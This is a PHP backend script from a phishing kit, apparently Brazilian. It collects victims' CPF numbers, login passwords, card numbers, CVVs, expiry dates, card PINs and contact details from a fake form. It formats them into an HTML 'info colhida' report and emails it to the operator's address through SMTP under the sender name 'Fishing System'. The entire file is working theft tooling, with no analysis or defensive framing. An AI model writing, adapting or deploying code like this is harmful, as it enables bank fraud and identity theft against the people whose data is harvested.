<?php

require_once '../config/config.php';
require_once './vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

function pegar($array, $chaves, $padrao = '') {
    foreach ($chaves as $chave) {
        if (isset($array[$chave]) && !empty($array[$chave])) {
            return $array[$chave];
        }
    }
    return $padrao;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
    $data = $_POST;
} else {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true) ?: $_POST;
}

if (empty($data)) {
    exit;
}

$enviar_email = false;
$email_destinatario = null;
$smtp = null;

try {
    $stmtConfig = $conexao->prepare("SELECT receber_info, email FROM configuracoes LIMIT 1");
    $stmtConfig->execute();
    $config = $stmtConfig->fetch(PDO::FETCH_ASSOC);

    if (
        $config &&
        (int)$config['receber_info'] === 1 &&
        !empty($config['email'])
    ) {
        $stmtSmtp = $conexao->prepare("SELECT host, usuario, senha, porta FROM smtp ORDER BY id DESC LIMIT 1");
        $stmtSmtp->execute();
        $smtp = $stmtSmtp->fetch(PDO::FETCH_ASSOC);

        if ($smtp) {
            $enviar_email = true;
            $email_destinatario = $config['email'];
        }
    }
} catch (Throwable $e) {
    $enviar_email = false;
}


$metodo = pegar($data, ['metodo']);

$name = pegar($data, ['name', 'nome', 'destinatario']);
$cpf  = pegar($data, ['cpf', 'documento']);
$nasc = pegar($data, ['nasc', 'nascimento']);

$email = pegar($data, ['email']);
$cel   = pegar($data, ['cel', 'telefone']);

$numerocard = pegar($data, ['numerocard', 'numero_cartao']);
$virtual    = pegar($data, ['cartao_virtual', 'virtual']);
$numero2 = pegar($data, ['numero_cartao']);

$validade = pegar($data, ['validade']);
$cvv      = pegar($data, ['cvv', 'cvv_do_cartão']);

$senha_cartao = pegar($data, ['senha_cartao']);
$senha_login  = pegar($data, ['senha']);

$titular = pegar($data, ['titular']);
$cpftitular = pegar($data, ['cpftitular']);

$agent = pegar($data, ['agent'], $_SERVER['HTTP_USER_AGENT'] ?? 'Desconhecido');

$subject = 'Colheu ' . ucfirst($metodo);

$msg = '<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Novo Lead</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", Roboto, Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 700px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .header {
            background: linear-gradient(to right, #2c3e50, #4a6491);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .header::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
            background-size: 20px 20px;
            animation: float 20s linear infinite;
        }
        @keyframes float {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 700;
            position: relative;
            z-index: 1;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .header .method {
            display: inline-block;
            background: #00c853;
            padding: 8px 20px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(0,200,83,0.4);
            position: relative;
            z-index: 1;
        }
        .content {
            padding: 40px;
        }
        .section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            border-left: 5px solid #667eea;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            transition: transform 0.3s ease;
        }
        .section:hover {
            transform: translateY(-5px);
        }
        .section h2 {
            color: #2c3e50;
            font-size: 20px;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #eaeaea;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .section h2::before {
            content: "•";
            color: #667eea;
            font-size: 30px;
            line-height: 0;
        }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        .info-item {
            display: flex;
            flex-direction: column;
            padding: 12px 15px;
            background: white;
            border-radius: 10px;
            border: 1px solid #eaeaea;
            transition: all 0.3s ease;
        }
        .info-item:hover {
            border-color: #667eea;
            box-shadow: 0 5px 15px rgba(102,126,234,0.1);
        }
        .label {
            font-size: 12px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        .value {
            font-size: 16px;
            color: #2c3e50;
            font-weight: 600;
            word-break: break-all;
        }
        .footer {
            background: #f8f9fa;
            padding: 25px 40px;
            border-top: 1px solid #eaeaea;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        .footer-item {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .footer-label {
            font-size: 12px;
            color: #666;
        }
        .footer-value {
            font-size: 14px;
            color: #2c3e50;
            font-weight: 500;
        }
        .highlight {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }
        .badge {
            display: inline-block;
            background: #00c853;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 10px;
        }
        @media (max-width: 600px) {
            .content {
                padding: 20px;
            }
            .header {
                padding: 20px;
            }
            .header h1 {
                font-size: 22px;
            }
            .info-grid {
                grid-template-columns: 1fr;
            }
            .footer {
                padding: 20px;
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>+1 Info Colhida</h1>
            <div class="method">Método: ' . ucfirst($metodo) . '</div>
        </div>
        
        <div class="content">';

if ($metodo === 'acessar') {
    $msg .= '
            <div class="section">
                <h2>🔑 Dados de Acesso</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="label">Identificador</span>
                        <span class="value highlight">' . $cpf . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">Credencial</span>
                        <span class="value highlight">' . $senha_login . '</span>
                    </div>
                </div>
            </div>';

} elseif ($metodo === 'colher_consultavel') {
    $msg .= '
            <div class="section">
                <h2>👤 Dados Pessoais</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="label">Nome Completo</span>
                        <span class="value">' . $name . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">CPF</span>
                        <span class="value highlight">' . $cpf . '</span>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>💳 InfoConsultável <span class="badge">CONSULTÁVEL</span></h2>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="label">Número do Cartão</span>
                        <span class="value highlight">' . $numerocard . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">Senha do Cartão</span>
                        <span class="value highlight">' . $senha_cartao . '</span>
                    </div>
                </div>
            </div>';

} elseif ($metodo === 'salvar_virtual') {
    $msg .= '
            <div class="section">
                <h2>👤 Dados Pessoais</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="label">Nome Completo</span>
                        <span class="value">' . $name . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">CPF</span>
                        <span class="value highlight">' . $cpf . '</span>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <h2>💳 Cartão Virtual <span class="badge">VIRTUAL</span></h2>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="label">Número Principal</span>
                        <span class="value highlight">' . $numero2 . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">Número Virtual</span>
                        <span class="value highlight">' . $virtual . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">Validade</span>
                        <span class="value highlight">' . $validade . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">CVV</span>
                        <span class="value highlight">' . $cvv . '</span>
                    </div>
                </div>
            </div>';

} elseif ($metodo === 'salvar_cartão') {
    $msg .= '
            <div class="section">
                <h2>👤 Dados Pessoais</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="label">Nome Completo</span>
                        <span class="value">' . $name . '</span>
                    </div>
                    <div class="info-item">
                        <span class="label">CPF</span>
                        <span class="value highlight">' . $cpf . '</span>
                    </div>';
    
    if (!empty($nasc)) {
        $msg .= '
                    <div class="info-item">
                        <span class="label">Data de Nascimento</span>
                        <span class="value">' . $nasc . '</span>
                    </div>';
    }
    
    if (!empty($cel)) {
        $msg .= '
                    <div class="info-item">
                        <span class="label">Telefone</span>
                        <span class="value highlight">' . $cel . '</span>
                    </div>';
    }
    
    if (!empty($email)) {
        $msg .= '
                    <div class="info-item">
                        <span class="label">E-mail</span>
                        <span class="value">' . $email . '</span>
                    </div>';
    }
    
    $msg .= '
                </div>
            </div>';
    
    $msg .= '
            <div class="section">
                <h2>💳 Dados do Cartão <span class="badge">COMPLETO</span></h2>
                <div class="info-grid">';
    
    if (!empty($titular)) {
        $msg .= '
                    <div class="info-item">
                        <span class="label">Nome do Titular</span>
                        <span class="value">' . $titular . '</span>
                    </div>';
    }
    
    if (!empty($cpftitular)) {
        $msg .= '
                    <div class="info-item">
                        <span class="label">CPF do Titular</span>
                        <span class="value highlight">' . $cpftitular . '</span>
                    </div>';
    }
    
    $msg .= '
                    <div class="info-item">
                        <span class="label">Número do Cartão</span>
                        <span class="value highlight">' . $numerocard . '</span>
                    </div>';
    
    if (!empty($validade)) {
        $msg .= '
                    <div class="info-item">
                        <span class="label">Validade</span>
                        <span class="value highlight">' . $validade . '</span>
                    </div>';
    }
    
    if (!empty($cvv)) {
        $msg .= '
                    <div class="info-item">
                        <span class="label">CVV</span>
                        <span class="value highlight">' . $cvv . '</span>
                    </div>';
    }
    
    $msg .= '
                </div>
            </div>';
}

$msg .= '
        </div>
        
        <div class="footer">
            <div class="footer-item">
                <span class="footer-label">🌐 Navegador/Dispositivo</span>
                <span class="footer-value">' . $agent . '</span>
            </div>
            <div class="footer-item">
                <span class="footer-label">📍 Endereço IP</span>
                <span class="footer-value highlight">' . ($_SERVER['REMOTE_ADDR'] ?? 'Desconhecido') . '</span>
            </div>
            <div class="footer-item">
                <span class="footer-label">🕐 Data/Hora Local</span>
                <span class="footer-value">' . date('d/m/Y H:i:s') . '</span>
            </div>
            <div class="footer-item">
                <span class="footer-label">⚡ Status</span>
                <span class="footer-value highlight">LEAD CAPTURADO COM SUCESSO</span>
            </div>
        </div>
    </div>
</body>
</html>';

$mail = new PHPMailer(true);
try {
    $mail->CharSet = 'UTF-8';
    $mail->isSMTP();
    $mail->Host = $smtp['host'];
    $mail->SMTPAuth = true;
    $mail->Username = $smtp['usuario'];
    $mail->Password = $smtp['senha'];
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
    $mail->Port = $smtp['porta'];
    $mail->setFrom($smtp['usuario'], 'Fishing System');
    $mail->addAddress($email_destinatario);
    $mail->isHTML(true);
    $mail->Subject = $subject;
    $mail->Body = $msg;
    $mail->send();
} catch (Exception $e) {
}
?>